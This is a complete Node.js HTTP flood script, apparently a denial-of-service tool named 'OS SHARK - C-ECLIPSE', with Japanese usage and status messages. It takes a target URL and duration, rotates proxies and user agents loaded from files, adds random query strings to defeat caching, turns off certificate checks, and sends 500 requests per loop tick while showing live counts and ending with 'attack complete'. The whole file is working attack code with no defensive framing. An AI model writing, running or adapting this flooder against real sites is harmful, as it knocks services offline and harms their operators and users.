const https = require('https');
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');
const { HttpsProxyAgent } = require('https-proxy-agent');

if (process.argv.length < 4) {
    console.log('使い方: node attack.js <ターゲットURL> <時間（秒）>');
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const parsed = url.parse(target);

// Load user agents & proxies
const uas = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);

// Stats
let totalSent = 0;
let successCount = 0;
let failCount = 0;
let lastSent = 0;
const endTime = Date.now() + time * 1000;

console.clear();
console.log('\n===OS SHARK - C-ECLIPSE===\n');

function ra() {
    return randstr.generate({
        charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
        length: 8
    });
}

function sendRequest() {
    const path = parsed.path && parsed.path.includes('%RAND%')
        ? parsed.path.replace('%RAND%', ra())
        : parsed.path || '/';
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const agent = new HttpsProxyAgent('http://' + proxy);

    const options = {
        hostname: parsed.hostname,
        port: 443,
        path: path + '?' + ra(),
        method: 'GET',
        headers: {
            'User-Agent': uas[Math.floor(Math.random() * uas.length)].trim(),
            'Connection': 'keep-alive'
        },
        agent: agent,
        rejectUnauthorized: false
    };

    const req = https.request(options, (res) => {
        totalSent++;
        if (res.statusCode >= 200 && res.statusCode < 300) {
            successCount++;
        } else if (res.statusCode >= 400) {
            failCount++;
        }
    });

    req.on('error', () => {
        totalSent++;
        failCount++;
    });

    req.end();
}

// Max power flood
function flood() {
    if (Date.now() > endTime) return;
    for (let i = 0; i < 500; i++) { // Increase for harder hits
        sendRequest();
    }
    setImmediate(flood);
}

// Live stats
setInterval(() => {
    console.clear();
    console.log('===OS SHARK - C-ECLIPSE===');
    console.log(`総送信数: ${totalSent}`);
    console.log(`リクエスト毎秒: ${totalSent - lastSent}`);
    console.log(`成功数 (2xx): ${successCount}`);
    console.log(`失敗数 (4xx): ${failCount}`);
    const remaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
    console.log(`残り時間: ${remaining} 秒`);
    lastSent = totalSent;
}, 300);

// End after time
setTimeout(() => {
    console.clear();
    console.log('攻撃が完了しました。');
    process.exit(0);
}, time * 1000);

flood();
